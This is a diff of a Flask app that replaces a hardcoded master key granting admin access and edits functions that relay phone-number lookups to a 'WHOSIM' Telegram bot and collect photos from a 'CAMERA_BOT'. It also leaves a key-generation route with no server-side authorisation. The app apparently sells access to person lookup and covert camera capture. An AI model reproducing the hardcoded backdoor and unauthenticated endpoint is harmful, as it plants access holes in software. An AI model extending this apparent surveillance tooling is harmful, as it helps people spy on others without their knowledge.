@@ -48,16 +48,16 @@ def save_keys(keys):
         with open(KEY_FILE, 'w') as f: json.dump(keys, f, indent=4)
     except: pass
 
-# --- KEY VERIFICATION ---
+# --- KEY VERIFICATION (UPDATED MASTER KEY) ---
 @app.route('/verify-access', methods=['POST'])
 def verify_access():
     try:
         data = request.json
         user_key = data.get('key', '').strip()
         
-        # MASTER KEY LOGIC
-        if user_key == "FAIZAN_AZIZI_":
-            return jsonify({'status': 'valid', 'message': 'WELCOME OWNER FAIZAN!', 'is_admin': True})
+        # 🔴 NEW MASTER KEY LOGIC 🔴
+        if user_key == "AZIZI_2513":
+            return jsonify({'status': 'valid', 'message': 'WELCOME OWNER FAIZAN! (MASTER ACCESS)', 'is_admin': True})
 
         keys = load_keys()
         if user_key in keys:
@@ -88,7 +88,6 @@ def generate_key():
     try:
         data = request.json
         hours = data.get('hours')
-        # Direct generation, security handled by frontend/master key check
         new_key = "AZ-" + ''.join(random.choices(string.ascii_uppercase + string.digits, k=6))
         keys = load_keys()
         keys[new_key] = {'hours': int(hours), 'status': 'unused', 'created_at': datetime.now().isoformat()}
@@ -96,7 +95,7 @@ def generate_key():
         return jsonify({'key': new_key, 'duration': f'{hours} Hours'})
     except Exception as e: return jsonify({'error': str(e)})
 
-# --- WHOSIM LOGIC (UNTOUCHED) ---
+# --- WHOSIM LOGIC ---
 def clean_and_format_text(text):
     if not text: return ""
     text = text.replace("MAXX", "FAIZAN AZIZI")
@@ -123,7 +122,7 @@ async def ask_telegram_final(mobile_number):
         return "Timeout."
     except Exception as e: return f"System Error: {str(e)}"
 
-# --- CAMERA LOGIC (FIXED PHOTO DOWNLOAD) ---
+# --- CAMERA LOGIC ---
 async def start_camera_session():
     try:
         if not client.is_connected(): await client.connect()
@@ -162,32 +161,22 @@ async def upload_camera_image(file_bytes):
         return "Link not received."
     except Exception as e: return str(e)
 
-# --- 🛠️ FIXED PHOTO CHECK FUNCTION ---
 async def check_new_photos():
     global last_photo_id
     new_photos = []
     try:
         if not client.is_connected(): await client.connect()
         messages = await client.get_messages(CAMERA_BOT, min_id=last_photo_id, limit=20)
-        
         for msg in messages:
             if msg.photo:
-                # Create a memory buffer
                 buffer = io.BytesIO()
-                # Download into buffer
                 await client.download_media(msg.photo, file=buffer)
-                # Reset pointer to start
                 buffer.seek(0)
-                # Encode to Base64
                 b64 = base64.b64encode(buffer.read()).decode('utf-8')
                 new_photos.append(b64)
-                
                 if msg.id > last_photo_id: last_photo_id = msg.id
-        
         return new_photos
-    except Exception as e:
-        print(f"Photo Error: {e}")
-        return []
+    except Exception as e: return []
 
 # --- ROUTES ---
 @app.route('/')
